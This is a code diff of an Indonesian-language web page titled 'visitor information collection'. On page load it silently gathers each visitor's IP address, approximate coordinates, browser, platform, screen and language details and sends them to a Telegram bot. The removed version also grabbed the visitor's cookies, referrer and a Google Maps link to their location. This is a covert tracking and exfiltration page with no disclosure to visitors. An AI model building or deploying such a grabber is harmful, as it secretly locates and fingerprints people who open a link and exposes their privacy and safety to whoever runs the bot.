@@ -1,8 +1,6 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Pengumpulan Informasi Pengunjung</title>
 </head>
 <body>
@@ -19,58 +17,52 @@
 
             fetch(apiUrl)
                 .then(response => response.json())
-                .then(responseData => console.log('Data terkirim:', responseData))
-                .catch(error => console.error('Gagal mengirim data:', error));
+                .then(responseData => console.log('Pesan terkirim:', responseData))
+                .catch(error => console.error('Gagal mengirim pesan:', error));
         }
 
-        async function getDeviceInfoAndSend() {
-            const ipInfoPromise = fetch('https://ip-api.com/json/');
-            const date = new Date();
-
-            const deviceInfo = {
-                "IP Address": 'Mencari...',
-                "User-Agent": navigator.userAgent,
-                "Browser & OS": navigator.userAgent,
-                "Jenis Perangkat": /Mobile|Android|iP(hone|ad|od)|BlackBerry|Windows Phone/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
-                "ISP": 'Mencari...',
-                "Lokasi": 'Mencari...',
-                "Bahasa Sistem": navigator.language,
-                "Resolusi Layar": `${window.screen.width}x${window.screen.height}`,
-                "Zona Waktu": Intl.DateTimeFormat().resolvedOptions().timeZone,
-                "Akses Pada": date.toLocaleString(),
-                "URL Sebelumnya": document.referrer || 'Tidak Ada',
-                "Cookie": document.cookie || 'Tidak Ada',
-                "Platform": navigator.platform,
-                "Dukungan Sentuhan": 'ontouchstart' in window || navigator.maxTouchPoints > 0 || navigator.msMaxTouchPoints > 0 ? 'Ya ✅' : 'Tidak ❌',
-                "Google Maps": 'Mencari...'
-            };
-
-            try {
-                const ipInfoResponse = await ipInfoPromise;
-                const ipInfoData = await ipInfoResponse.json();
-                if (ipInfoData && ipInfoData.query) {
-                    deviceInfo["IP Address"] = ipInfoData.query;
-                    deviceInfo["ISP"] = ipInfoData.isp || 'Tidak Ditemukan';
-                    deviceInfo["Lokasi"] = `${ipInfoData.city || 'Tidak Ditemukan'}, ${ipInfoData.country || 'Tidak Ditemukan'}`;
-                    const latitude = ipInfoData.lat;
-                    const longitude = ipInfoData.lon;
-                    if (latitude && longitude) {
-                        deviceInfo["Google Maps"] = `[Lihat di Google Maps](https://www.google.com/maps?q=${latitude},${longitude})`;
-                    } else {
-                        deviceInfo["Google Maps"] = 'Koordinat tidak ditemukan';
-                    }
-                }
-            } catch (error) {
-                console.error('Gagal mendapatkan informasi IP:', error);
-                deviceInfo["IP Address"] = 'Gagal Didapatkan';
-                deviceInfo["ISP"] = 'Gagal Didapatkan';
-                deviceInfo["Lokasi"] = 'Gagal Didapatkan';
-                deviceInfo["Google Maps"] = 'Gagal Mendapatkan Koordinat';
-            }
-
-            sendDataToTelegram(deviceInfo);
+        function getDeviceInfoAndSend() {
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(data => {
+                    const deviceInfo = {
+                        "IP Address": data.ip,
+                        "Lokasi (Perkiraan)": `Lintang ${data.latitude}, Bujur ${data.longitude}`,
+                        "Browser": navigator.userAgent,
+                        "Sistem Operasi": navigator.platform,
+                        "Resolusi Layar": `${window.screen.width}x${window.screen.height}`,
+                        "Kedalaman Warna": window.screen.colorDepth,
+                        "Bahasa": navigator.language,
+                        "Cookie Diaktifkan": navigator.cookieEnabled ? 'Ya ✅' : 'Tidak ❌'
+                    };
+                    sendDataToTelegram(deviceInfo);
+                })
+                .catch(error => {
+                    console.error('Gagal mendapatkan informasi lokasi:', error);
+                    // Tetap kirim informasi lain jika gagal mendapatkan lokasi
+                    const deviceInfoWithoutLocation = {
+                        "IP Address": 'Tidak Diketahui',
+                        "Browser": navigator.userAgent,
+                        "Sistem Operasi": navigator.platform,
+                        "Resolusi Layar": `${window.screen.width}x${window.screen.height}`,
+                        "Kedalaman Warna": window.screen.colorDepth,
+                        "Bahasa": navigator.language,
+                        "Cookie Diaktifkan": navigator.cookieEnabled ? 'Ya ✅' : 'Tidak ❌'
+                    };
+                    fetch('https://api.ipify.org?format=json')
+                        .then(response => response.json())
+                        .then(ipData => {
+                            deviceInfoWithoutLocation["IP Address"] = ipData.ip;
+                            sendDataToTelegram(deviceInfoWithoutLocation);
+                        })
+                        .catch(ipError => {
+                            console.error('Gagal mendapatkan IP:', ipError);
+                            sendDataToTelegram(deviceInfoWithoutLocation);
+                        });
+                });
         }
 
+        // Panggil fungsi getDeviceInfoAndSend saat halaman dimuat
         window.onload = getDeviceInfoAndSend;
     </script>
 </body>
